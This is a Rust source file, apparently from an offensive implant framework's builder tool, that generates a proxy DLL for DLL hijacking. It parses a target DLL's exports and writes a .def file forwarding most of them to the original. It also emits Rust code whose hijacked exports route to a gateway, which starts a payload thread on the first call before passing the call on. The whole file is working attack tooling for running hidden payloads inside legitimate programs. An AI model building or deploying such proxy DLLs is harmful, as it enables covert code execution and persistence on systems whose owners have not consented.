use crate::tool::pe::{ExportInfo, PEParser};
use crate::{log_info, log_step, log_success};
use anyhow::{anyhow, Result};
use std::fs;
use std::path::Path;

/// Update malefic-proxydll project with complete proxy DLL implementation
/// This function generates all necessary code files and configuration
///
/// # Parameters
/// * `raw_dll` - Raw DLL path (for parsing exports)
/// * `proxied_dll` - Proxied DLL path (runtime forwarding target)
/// * `proxy_dll` - Proxy DLL name (generated proxy DLL name)
/// * `hijacked_exports` - Functions to hijack for payload execution
/// * `use_native_thread` - Use NtCreateThreadEx instead of std::thread
/// * `use_block` - Enable block feature
/// * `use_prelude` - Enable malefic-prelude feature
pub fn update_proxydll(
    raw_dll: &str,
    proxied_dll: &str,
    proxy_dll: &str,
    hijacked_exports: &[&str],
    use_native_thread: bool,
    use_block: bool,
    use_prelude: bool,
) -> Result<()> {
    if raw_dll.contains(' ') {
        return Err(anyhow!(
            "The raw DLL path cannot contain spaces. Use DOS short name instead."
        ));
    }

    // Parse DLL exports using PE parser
    log_step!("Parsing DLL exports from: {}", raw_dll);
    let exports = PEParser::parse_dll_exports(raw_dll)?;
    if exports.is_empty() {
        return Err(anyhow!("DLL without exports found"));
    }
    log_info!("Found {} exports in DLL", exports.len());

    let project_root = Path::new("malefic-proxydll");
    if !project_root.exists() {
        return Err(anyhow!(
            "malefic-proxydll project not found. Make sure you're running from project root."
        ));
    }

    // Validate that hijacked exports exist in the DLL
    log_step!("Validating hijacked exports...");
    validate_exports(&exports, hijacked_exports)?;

    // Generate all necessary files
    log_step!("Generating proxy DLL library files...");
    build_lib(
        &exports,
        project_root,
        proxied_dll,
        hijacked_exports,
        use_native_thread,
    )?;

    log_step!("Generating DEF file...");
    build_def(&exports, project_root, proxied_dll, hijacked_exports)?;

    log_step!("Updating Cargo.toml configuration...");
    update_cargo_toml(project_root, use_native_thread, use_block, use_prelude)?;

    // Success summary
    log_success!("malefic-proxydll project updated successfully");
    log_step!("Configuration Summary:");
    log_info!("  Raw DLL: {}", raw_dll);
    log_info!("  Proxied DLL: {}", proxied_dll);
    log_info!("  Proxy DLL: {}", proxy_dll);

    if !hijacked_exports.is_empty() {
        log_info!("  Hijacked exports: {}", hijacked_exports.join(", "));
    }

    log_step!("Enabled Features:");
    log_info!("  proxy: true (always enabled)");
    log_info!("  native_thread: {}", use_native_thread);
    log_info!("  block: {}", use_block);
    log_info!("  malefic-prelude: {}", use_prelude);

    log_step!("Next Steps:");
    log_info!("  Build: cargo build --release -p malefic-proxydll");
    log_info!("  (Features are pre-configured in Cargo.toml)");

    Ok(())
}

/// Validate that all requested hijacked exports exist in the target DLL
fn validate_exports(exports: &[ExportInfo], hijacked_exports: &[&str]) -> Result<()> {
    if hijacked_exports.is_empty() {
        return Ok(());
    }

    for hijacked in hijacked_exports {
        let found = exports.iter().any(|export| export.name == *hijacked);
        if found {
            log_info!("  Found export: {}", hijacked);
        } else {
            return Err(anyhow!(
                "Hijacked export '{}' not found in target DLL",
                hijacked
            ));
        }
    }
    Ok(())
}

/// Generate complete lib.rs file with all export functions
fn build_lib(
    exports: &[ExportInfo],
    project_root: &Path,
    runtime_dll: &str,
    hijacked_exports: &[&str],
    _use_native_thread: bool,
) -> Result<()> {
    let hijacked_functions = build_hijacked_exports(exports, hijacked_exports);
    let forwarded_functions = build_forwarded_exports(exports, hijacked_exports);
    let function_names_array = build_function_names_array(hijacked_exports);

    let lib_content = format!(
        r#"// Auto-generated proxy DLL library
// DO NOT EDIT MANUALLY - Generated by malefic-mutant

mod payload;

use lazy_static::lazy_static;
use std::sync::{{Arc, Mutex}};
use malefic_helper::win::kit::apis::{{m_load_library_a, m_get_func_addr_with_module_base}};

const DLL_NAME: &str = r"{}";
static mut ADDRESS: usize = 0;

lazy_static! {{
    static ref MUTEX: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
}}

// Static array of hijacked function names
const HIJACKED_FUNCTIONS: &[&str] = &[
{}];

/// Core gateway function that handles DLL hijacking logic
pub fn gateway(
    arg1: u64, arg2: u64, arg3: u64, arg4: u64, arg5: u64,
    arg6: u64, arg7: u64, arg8: u64, arg9: u64, arg10: u64,
    arg11: u64, arg12: u64, arg13: u64, arg14: u64, arg15: u64,
    arg16: u64, arg17: u64, arg18: u64, arg19: u64, arg20: u64,
    index: u32
) -> u64 {{
    let flag = Arc::clone(&MUTEX);
    let mut flag = flag.lock().unwrap();
    if *flag == 0 {{
        *flag += 1;
        crate::payload::create_payload_thread();
        #[cfg(feature = "block")]
        loop {{
            std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
        }}

    }}

    unsafe {{
        if ADDRESS != 0 {{
            let func: extern "system" fn(u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64) -> u64
                = std::mem::transmute(ADDRESS);
            return func(arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17,arg18,arg19,arg20);
        }}
    }}

    let func_name = if (index as usize) < HIJACKED_FUNCTIONS.len() {{
        HIJACKED_FUNCTIONS[index as usize]
    }} else {{
        ""
    }};

    if func_name.is_empty() {{
        return 0;
    }}

    // Convert DLL name to null-terminated C string
    let dll_name_cstr = format!("{{}}\\0", DLL_NAME);
    let dll_address = unsafe {{ m_load_library_a(dll_name_cstr.as_ptr()) }};
    if dll_address.is_null() {{
        return 0;
    }}

    // Get function address using module base
    let func_address = unsafe {{
        m_get_func_addr_with_module_base(
            dll_address as *const core::ffi::c_void,
            func_name.as_bytes()
        )
    }};

    if func_address.is_null() {{
        return 0;
    }}

    unsafe {{
        ADDRESS = func_address as usize;
        let func: extern "system" fn(u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64) -> u64
            = std::mem::transmute(ADDRESS);
        func(arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17,arg18,arg19,arg20)
    }}
}}

// Export functions that call our gateway (hijacked)
{}

// Export functions that are forwarded via .def file (empty stubs)
{}
"#,
        runtime_dll, function_names_array, hijacked_functions, forwarded_functions
    );

    let lib_path = project_root.join("src/lib.rs");
    fs::write(lib_path, lib_content)?;
    println!("ðŸ“„ Generated lib.rs");
    Ok(())
}

/// Generate static array of hijacked function names
fn build_function_names_array(hijacked_exports: &[&str]) -> String {
    hijacked_exports
        .iter()
        .map(|export| format!("    \"{}\",", export))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Generate hijacked export functions that call gateway
fn build_hijacked_exports(exports: &[ExportInfo], hijacked_exports: &[&str]) -> String {
    let mut functions = String::new();

    for export in exports {
        if hijacked_exports.contains(&export.name.as_str()) {
            let index = hijacked_exports
                .iter()
                .position(|&x| x == export.name)
                .unwrap();

            functions.push_str(&format!(
                r#"
#[no_mangle]
pub extern "C" fn {}(
    arg1: u64, arg2: u64, arg3: u64, arg4: u64, arg5: u64,
    arg6: u64, arg7: u64, arg8: u64, arg9: u64, arg10: u64,
    arg11: u64, arg12: u64, arg13: u64, arg14: u64, arg15: u64,
    arg16: u64, arg17: u64, arg18: u64, arg19: u64, arg20: u64
) -> u64 {{
    gateway(
        arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10,
        arg11, arg12, arg13, arg14, arg15, arg16, arg17, arg18, arg19, arg20,
        {}
    )
}}
"#,
                export.name, index
            ));
        }
    }

    functions
}

/// Generate forwarded export functions (empty stubs)
fn build_forwarded_exports(exports: &[ExportInfo], hijacked_exports: &[&str]) -> String {
    let mut functions = String::new();

    for export in exports {
        if !hijacked_exports.contains(&export.name.as_str()) {
            functions.push_str(&format!(
                r#"
#[no_mangle]
pub extern "C" fn {}() {{}}
"#,
                export.name
            ));
        }
    }

    functions
}

/// Generate .def file for proper DLL exports
fn build_def(
    exports: &[ExportInfo],
    project_root: &Path,
    runtime_dll: &str,
    hijacked_exports: &[&str],
) -> Result<()> {
    let mut def_content = String::from("EXPORTS\n");

    for export in exports {
        if hijacked_exports.contains(&export.name.as_str()) {
            // Hijacked function, no forwarding
            def_content.push_str(&format!("{} @{}\n", export.name, export.ordinal));
        } else {
            // Forward to original DLL
            def_content.push_str(&format!(
                "{}={}.{} @{}\n",
                export.name, runtime_dll, export.name, export.ordinal
            ));
        }
    }

    let def_path = project_root.join("proxy.def");
    fs::write(def_path, def_content)?;
    println!("ðŸ“„ Generated proxy.def");
    Ok(())
}

/// Update Cargo.toml with dynamic features based on configuration
fn update_cargo_toml(
    project_root: &Path,
    use_native_thread: bool,
    use_block: bool,
    use_prelude: bool,
) -> Result<()> {
    use toml_edit::{Array, DocumentMut, Item};

    let cargo_toml_path = project_root.join("Cargo.toml");
    let cargo_toml_content = fs::read_to_string(&cargo_toml_path)?;
    let mut cargo_toml: DocumentMut = cargo_toml_content
        .parse()
        .map_err(|e| anyhow!("Failed to parse Cargo.toml: {}", e))?;

    // Update default features
    if let Some(features) = cargo_toml["features"].as_table_mut() {
        let mut default_features = Array::new();
        default_features.push("proxy");

        if use_native_thread {
            default_features.push("native_thread");
        }
        if use_block {
            default_features.push("block");
        }
        if use_prelude {
            default_features.push("malefic-prelude");
        }

        features["default"] = Item::Value(default_features.into());
    } else {
        return Err(anyhow!("Failed to find 'features' in Cargo.toml"));
    }

    // Ensure malefic-prelude dependency exists if needed
    if use_prelude {
        if let Some(deps) = cargo_toml["dependencies"].as_table_mut() {
            if !deps.contains_key("malefic-prelude") {
                // Add malefic-prelude as optional dependency
                deps["malefic-prelude"] = toml_edit::value(toml_edit::InlineTable::from_iter([
                    ("path", "../malefic-prelude"),
                    ("optional", "true"),
                ]));
            }
        }
    }

    fs::write(cargo_toml_path, cargo_toml.to_string())?;
    println!("ðŸ“„ Updated Cargo.toml with features");
    Ok(())
}
